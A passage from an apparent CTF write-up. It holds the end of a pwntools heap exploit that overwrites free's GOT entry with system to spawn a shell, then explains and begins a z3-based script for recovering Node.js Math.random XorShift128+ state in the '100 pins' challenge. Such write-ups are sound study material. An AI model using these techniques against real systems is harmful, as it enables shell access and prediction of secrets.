</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>puts_leak</span> <span class=o>-</span> <span class=mh>0x875a0</span>
</span></span><span class=line><span class=cl><span class=n>system_libc</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x55410</span>
</span></span><span class=line><span class=cl><span class=n>free_got</span> <span class=o>=</span> <span class=mh>0x409128</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!] puts_atlibc: </span><span class=si>%x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>puts_leak</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!] libc_base: </span><span class=si>%x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>libc_base</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!] libc_system: </span><span class=si>%x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>system_libc</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>write_slot</span><span class=p>(</span><span class=mi>20</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>free_got</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>write_slot</span><span class=p>(</span><span class=mi>21</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>system_libc</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>write_slot</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;/bin/sh&#34;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=n>chunk_size</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;3&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;slot&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><h2 class="relative group">100 pins<div id=100-pins class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#100-pins aria-label=Anchor>#</a></span></h2><blockquote><p>4 digits pin are too weak&mldr; How about 100 of them?
nc 18.183.134.249 1234</p></blockquote><h3 class="relative group">The bug(s)<div id=the-bugs class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-bugs aria-label=Anchor>#</a></span></h3><p>The challenge is made with NodeJS (15.3.0) and the main point was
<code>Math.random()</code>. This PRNG
<a href=https://devdocs.io/javascript/global_objects/math/random target=_blank>is not cryptographically secure</a>,
as we can recorver the initial states of the <code>XorShift128+</code> with enough
consecutive outputs and some symbolic execution.</p><p>We notice that the &ldquo;Mastermind&rdquo; behind this challenge allows us to gather more
information than usual, because there is no check on the length of the input. In
fact we can recover the (unique) digits of the pin choosing the pattern:
<code>'1'*2^0 + '2'*2^1 + '3'*2^2 + '4'*2^3 + ... + '9'*2^8</code>.</p><p>This gives us a result that tells us exactly the digits of the pin. We can get
this by adding the number of digits in the correct position and the remaining
number of correct digits that are not in the correct position. This number, in
binary, gives us the corresponding digit in the pattern.</p><p>After getting the digits we find the correct permutation with a &ldquo;guess and
prune&rdquo; algorithm, discarding any rearrangement that is incompatible with the
results of the previous guesses.</p><p>In the end our algorithm is capable of finding a correct pin with an average of
4-5 attempts, and with a bit of luck we are able to retrieve the 11 pins needed
to ensure that z3 outputs a unique solution in less than 39 attempts.</p><p>Once we have the initial state of the PRNG, we face another problem: the actual
values being generated are stored in a &ldquo;pool&rdquo; of 64 numbers, that is refreshed
with 64 new ones every time it is empty. The numbers within the pool are then
outputted in reverse order (as explained in this presentation and
<a href="https://www.youtube.com/watch?v=_Iv6fBrcbAM" target=_blank>video</a>). This means that, if the
order of the random generation is 1&mldr;64||65&mldr;128, we get 64&mldr;54 and we need
to predict 53&mldr;1||128&mldr;93. Once we get the seed, the &ldquo;next&rdquo; number generated
will be the 54th. This means that we need to reverse the XorShift128+ algorithm
to retrieve the values 53&mldr;1! Fortunately,
<a href=https://blog.securityevaluators.com/xorshift128-backward-ff3365dc0c17 target=_blank>this isn&rsquo;t a problem at all</a>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=n>remote</span><span class=p>,</span> <span class=n>process</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>itertools</span> <span class=kn>import</span> <span class=n>permutations</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>decimal</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>random</span> <span class=kn>import</span> <span class=n>shuffle</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>z3</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>MAX_UNUSED_THREADS</span> <span class=o>=</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#Credits to Douglas Goddard and d0nutptr</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>reverse17</span><span class=p>(</span><span class=n>val</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>top34</span> <span class=o>=</span> <span class=p>(</span><span class=n>val</span> <span class=o>^</span> <span class=p>(</span><span class=n>val</span> <span class=o>&gt;&gt;</span> <span class=mi>17</span><span class=p>))</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFC0000000</span>
</span></span><span class=line><span class=cl>    <span class=n>top51</span> <span class=o>=</span> <span class=p>(</span><span class=n>val</span> <span class=o>^</span> <span class=p>(</span><span class=n>top34</span> <span class=o>&gt;&gt;</span> <span class=mi>17</span><span class=p>))</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFE000</span>
</span></span><span class=line><span class=cl>    <span class=n>original</span> <span class=o>=</span> <span class=p>(</span><span class=n>val</span> <span class=o>^</span> <span class=p>(</span><span class=n>top51</span> <span class=o>&gt;&gt;</span> <span class=mi>17</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>original</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>reverse23</span><span class=p>(</span><span class=n>val</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>bot46</span> <span class=o>=</span> <span class=p>(</span><span class=n>val</span> <span class=o>^</span> <span class=p>(</span><span class=n>val</span> <span class=o>&lt;&lt;</span> <span class=mi>23</span><span class=p>))</span> <span class=o>&amp;</span> <span class=mh>0x3fffffffffff</span>
</span></span><span class=line><span class=cl>    <span class=n>original</span> <span class=o>=</span> <span class=p>(</span><span class=n>val</span> <span class=o>^</span> <span class=p>(</span><span class=n>bot46</span> <span class=o>&lt;&lt;</span>  <span class=mi>23</span><span class=p>))</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFFFFF</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>original</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>reverse_xs128p</span><span class=p>(</span><span class=n>state0</span><span class=p>,</span> <span class=n>state1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>prev_state1</span> <span class=o>=</span> <span class=n>state0</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFFFFF</span>
</span></span><span class=line><span class=cl>    <span class=n>prev_state0</span> <span class=o>=</span> <span class=n>state1</span> <span class=o>^</span> <span class=p>(</span><span class=n>state0</span> <span class=o>&gt;&gt;</span> <span class=mi>26</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFFFFF</span>
</span></span><span class=line><span class=cl>    <span class=n>prev_state0</span> <span class=o>=</span> <span class=n>prev_state0</span> <span class=o>^</span> <span class=n>state0</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFFFFF</span>
</span></span><span class=line><span class=cl>    <span class=n>prev_state0</span> <span class=o>=</span> <span class=n>reverse17</span><span class=p>(</span><span class=n>prev_state0</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFFFFF</span>
</span></span><span class=line><span class=cl>    <span class=n>prev_state0</span> <span class=o>=</span> <span class=n>reverse23</span><span class=p>(</span><span class=n>prev_state0</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFFFFF</span>
</span></span><span class=line><span class=cl>    <span class=n>generated</span> <span class=o>=</span> <span class=n>prev_state0</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFFFFF</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>prev_state0</span><span class=p>,</span> <span class=n>prev_state1</span><span class=p>,</span> <span class=n>generated</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Calculates xs128p (XorShift128Plus)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>xs128p</span><span class=p>(</span><span class=n>state0</span><span class=p>,</span> <span class=n>state1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>s1</span> <span class=o>=</span> <span class=n>state0</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFFFFF</span>
</span></span><span class=line><span class=cl>    <span class=n>s0</span> <span class=o>=</span> <span class=n>state1</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFFFFF</span>
</span></span><span class=line><span class=cl>    <span class=n>s1</span> <span class=o>^=</span> <span class=p>(</span><span class=n>s1</span> <span class=o>&lt;&lt;</span> <span class=mi>23</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFFFFF</span>
</span></span><span class=line><span class=cl>    <span class=n>s1</span> <span class=o>^=</span> <span class=p>(</span><span class=n>s1</span> <span class=o>&gt;&gt;</span> <span class=mi>17</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFFFFF</span>
</span></span><span class=line><span class=cl>    <span class=n>s1</span> <span class=o>^=</span> <span class=n>s0</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFFFFF</span>
</span></span><span class=line><span class=cl>    <span class=n>s1</span> <span class=o>^=</span> <span class=p>(</span><span class=n>s0</span> <span class=o>&gt;&gt;</span> <span class=mi>26</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFFFFF</span>
</span></span><span class=line><span class=cl>    <span class=n>state0</span> <span class=o>=</span> <span class=n>state1</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFFFFF</span>
</span></span><span class=line><span class=cl>    <span class=n>state1</span> <span class=o>=</span> <span class=n>s1</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFFFFF</span>
</span></span><span class=line><span class=cl>    <span class=n>generated</span> <span class=o>=</span> <span class=n>state0</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFFFFF</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>state0</span><span class=p>,</span> <span class=n>state1</span><span class=p>,</span> <span class=n>generated</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sym_xs128p</span><span class=p>(</span><span class=n>sym_state0</span><span class=p>,</span> <span class=n>sym_state1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># Symbolically represent xs128p</span>
</span></span><span class=line><span class=cl>    <span class=n>s1</span> <span class=o>=</span> <span class=n>sym_state0</span>
</span></span><span class=line><span class=cl>    <span class=n>s0</span> <span class=o>=</span> <span class=n>sym_state1</span>
</span></span><span class=line><span class=cl>    <span class=n>s1</span> <span class=o>^=</span> <span class=p>(</span><span class=n>s1</span> <span class=o>&lt;&lt;</span> <span class=mi>23</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s1</span> <span class=o>^=</span> <span class=n>LShR</span><span class=p>(</span><span class=n>s1</span><span class=p>,</span> <span class=mi>17</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s1</span> <span class=o>^=</span> <span class=n>s0</span>
</span></span><span class=line><span class=cl>    <span class=n>s1</span> <span class=o>^=</span> <span class=n>LShR</span><span class=p>(</span><span class=n>s0</span><span class=p>,</span> <span class=mi>26</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sym_state0</span> <span class=o>=</span> <span class=n>sym_state1</span>
</span></span><span class=line><span class=cl>    <span class=n>sym_state1</span> <span class=o>=</span> <span class=n>s1</span>
</span></span><span class=line><span class=cl>    <span class=c1># end symbolic execution</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>sym_state0</span><span class=p>,</span> <span class=n>sym_state1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Symbolic execution of xs128p</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sym_floor_random</span><span class=p>(</span><span class=n>slvr</span><span class=p>,</span> <span class=n>sym_state0</span><span class=p>,</span> <span class=n>sym_state1</span><span class=p>,</span> <span class=n>generated</span><span class=p>,</span> <span class=n>multiple</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sym_state0</span><span class=p>,</span> <span class=n>sym_state1</span> <span class=o>=</span> <span class=n>sym_xs128p</span><span class=p>(</span><span class=n>sym_state0</span><span class=p>,</span> <span class=n>sym_state1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># &#34;::ToDouble&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>calc</span> <span class=o>=</span> <span class=n>LShR</span><span class=p>(</span><span class=n>sym_state0</span><span class=p>,</span> <span class=mi>12</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>lower</span> <span class=o>=</span> <span class=n>from_double</span><span class=p>(</span><span class=n>Decimal</span><span class=p>(</span><span class=n>generated</span><span class=p>)</span> <span class=o>/</span> <span class=n>Decimal</span><span class=p>(</span><span class=n>multiple</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>upper</span> <span class=o>=</span> <span class=n>from_double</span><span class=p>((</span><span class=n>Decimal</span><span class=p>(</span><span class=n>generated</span><span class=p>)</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>/</span> <span class=n>Decimal</span><span class=p>(</span><span class=n>multiple</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>lower_mantissa</span> <span class=o>=</span> <span class=p>(</span><span class=n>lower</span> <span class=o>&amp;</span> <span class=mh>0x000FFFFFFFFFFFFF</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>upper_mantissa</span> <span class=o>=</span> <span class=p>(</span><span class=n>upper</span> <span class=o>&amp;</span> <span class=mh>0x000FFFFFFFFFFFFF</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>upper_expr</span> <span class=o>=</span> <span class=p>(</span><span class=n>upper</span> <span class=o>&gt;&gt;</span> <span class=mi>52</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0x7FF</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>slvr</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>And</span><span class=p>(</span><span class=n>lower_mantissa</span> <span class=o>&lt;=</span> <span class=n>calc</span><span class=p>,</span> <span class=n>Or</span><span class=p>(</span><span class=n>upper_mantissa</span> <span class=o>&gt;=</span> <span class=n>calc</span><span class=p>,</span> <span class=n>upper_expr</span> <span class=o>==</span> <span class=mi>1024</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>sym_state0</span><span class=p>,</span> <span class=n>sym_state1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_instance</span><span class=p>(</span><span class=n>points</span><span class=p>,</span> <span class=n>multiple</span><span class=p>,</span> <span class=n>unknown_leading</span><span class=o>=</span><span class=kc>False</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># setup symbolic state for xorshift128+</span>
</span></span><span class=line><span class=cl>    <span class=n>ostate0</span><span class=p>,</span> <span class=n>ostate1</span> <span class=o>=</span> <span class=n>BitVecs</span><span class=p>(</span><span class=s1>&#39;ostate0 ostate1&#39;</span><span class=p>,</span> <span class=mi>64</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sym_state0</span> <span class=o>=</span> <span class=n>ostate0</span>
</span></span><span class=line><span class=cl>    <span class=n>sym_state1</span> <span class=o>=</span> <span class=n>ostate1</span>
</span></span><span class=line><span class=cl>    <span class=n>set_option</span><span class=p>(</span><span class=s2>&#34;parallel.enable&#34;</span><span class=p>,</span> <span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>set_option</span><span class=p>(</span><span class=s2>&#34;parallel.threads.max&#34;</span><span class=p>,</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=nb>max</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>cpu_count</span><span class=p>()</span> <span class=o>-</span> <span class=n>MAX_UNUSED_THREADS</span><span class=p>,</span> <span class=mi>1</span><span class=p>)))</span>  <span class=c1># will use max or max cpu thread support, whatever is smaller</span>
</span></span><span class=line><span class=cl>    <span class=n>slvr</span> <span class=o>=</span> <span class=n>SolverFor</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;QF_BV&#34;</span><span class=p>)</span>  <span class=c1># This type of problem is much faster computed using QF_BV (also, if branching happens, we can use parallelization)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># run symbolic xorshift128+ algorithm for three iterations</span>
</span></span><span class=line><span class=cl>    <span class=c1># using the recovered numbers as constraints</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>unknown_leading</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># we want to try to predict one value ahead so let&#39;s slide one unknown into the calculation</span>
</span></span><span class=line><span class=cl>        <span class=n>sym_state0</span><span class=p>,</span> <span class=n>sym_state1</span> <span class=o>=</span> <span class=n>sym_xs128p</span><span class=p>(</span><span class=n>sym_state0</span><span class=p>,</span> <span class=n>sym_state1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>point</span> <span class=ow>in</span> <span class=n>points</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>sym_state0</span><span class=p>,</span> <span class=n>sym_state1</span> <span class=o>=</span> <span class=n>sym_floor_random</span><span class=p>(</span><span class=n>slvr</span><span class=p>,</span> <span class=n>sym_state0</span><span class=p>,</span> <span class=n>sym_state1</span><span class=p>,</span> <span class=n>point</span><span class=p>,</span> <span class=n>multiple</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>slvr</span><span class=o>.</span><span class=n>check</span><span class=p>()</span> <span class=o>==</span> <span class=n>sat</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># get a solved state</span>
</span></span><span class=line><span class=cl>        <span class=n>m</span> <span class=o>=</span> <span class=n>slvr</span><span class=o>.</span><span class=n>model</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>state0</span> <span class=o>=</span> <span class=n>m</span><span class=p>[</span><span class=n>ostate0</span><span class=p>]</span><span class=o>.</span><span class=n>as_long</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>state1</span> <span class=o>=</span> <span class=n>m</span><span class=p>[</span><span class=n>ostate1</span><span class=p>]</span><span class=o>.</span><span class=n>as_long</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>state0</span><span class=p>,</span> <span class=n>state1</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Failed to find a valid solution&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span><span class=p>,</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_random</span><span class=p>(</span><span class=n>points</span><span class=p>,</span> <span class=n>multiple</span><span class=p>,</span> <span class=n>lead</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>lead</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>last_state0</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>        <span class=n>last_state1</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>int</span><span class=p>(</span><span class=n>lead</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>            <span class=n>last_state0</span><span class=p>,</span> <span class=n>last_state1</span> <span class=o>=</span> <span class=n>solve_instance</span><span class=p>(</span><span class=n>points</span><span class=p>,</span> <span class=n>multiple</span><span class=p>,</span> <span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>state0</span><span class=p>,</span> <span class=n>state1</span><span class=p>,</span> <span class=n>output</span> <span class=o>=</span> <span class=n>xs128p</span><span class=p>(</span><span class=n>last_state0</span><span class=p>,</span> <span class=n>last_state1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>new_point</span> <span class=o>=</span> <span class=n>math</span><span class=o>.</span><span class=n>floor</span><span class=p>(</span><span class=n>multiple</span> <span class=o>*</span> <span class=n>to_double</span><span class=p>(</span><span class=n>output</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>points</span> <span class=o>=</span> <span class=p>[</span><span class=n>new_point</span><span class=p>]</span> <span class=o>+</span> <span class=n>points</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>last_state0</span><span class=p>,</span> <span class=n>last_state1</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>solve_instance</span><span class=p>(</span><span class=n>points</span><span class=p>,</span> <span class=n>multiple</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>to_double</span><span class=p>(</span><span class=n>value</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>double_bits</span> <span class=o>=</span> <span class=p>(</span><span class=n>value</span> <span class=o>&gt;&gt;</span> <span class=mi>12</span><span class=p>)</span> <span class=o>|</span> <span class=mh>0x3FF0000000000000</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack</span><span class=p>(</span><span class=s1>&#39;d&#39;</span><span class=p>,</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=n>double_bits</span><span class=p>))[</span><span class=mi>0</span><span class=p>]</span> <span class=o>-</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>from_double</span><span class=p>(</span><span class=n>dbl</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;d&#39;</span><span class=p>,</span> <span class=n>dbl</span> <span class=o>+</span> <span class=mi>1</span><span class=p>))[</span><span class=mi>0</span><span class=p>]</span> <span class=o>&amp;</span> <span class=mh>0x7FFFFFFFFFFFFFFF</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>proof_of_work</span><span class=p>(</span><span class=n>prefix</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>c</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>guess</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>calculated</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>sha256</span><span class=p>((</span><span class=n>prefix</span><span class=o>+</span><span class=n>guess</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>calculated</span><span class=o>.</span><span class=n>endswith</span><span class=p>(</span><span class=s1>&#39;00000&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;found&#39;</span><span class=p>,</span> <span class=n>guess</span><span class=p>,</span> <span class=n>calculated</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>guess</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>c</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>c</span><span class=o>%</span><span class=mi>10</span><span class=o>**</span><span class=mi>6</span><span class=p>:</span> <span class=nb>print</span><span class=p>(</span><span class=n>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>alphabet</span> <span class=o>=</span> <span class=s1>&#39;1234567890&#39;</span>
</span></span><span class=line><span class=cl><span class=n>origin</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=nb>filter</span><span class=p>(</span><span class=k>lambda</span> <span class=n>k</span><span class=p>:</span> <span class=nb>len</span><span class=p>(</span><span class=nb>set</span><span class=p>(</span><span class=n>k</span><span class=p>))</span> <span class=o>==</span> <span class=mi>4</span> <span class=ow>and</span> <span class=nb>len</span><span class=p>(</span><span class=n>k</span><span class=p>)</span> <span class=o>==</span> <span class=mi>4</span><span class=p>,</span> <span class=p>[(</span><span class=s2>&#34;0000&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>))[</span><span class=o>-</span><span class=mi>4</span><span class=p>:]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10000</span><span class=p>)]))</span>
</span></span><span class=line><span class=cl><span class=n>special</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=o>*</span> <span class=p>(</span><span class=nb>pow</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=p>(</span><span class=n>i</span><span class=o>-</span><span class=mi>1</span><span class=p>)))</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>10</span><span class=p>)])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Solver</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>found</span> <span class=o>=</span> <span class=p>[]</span>
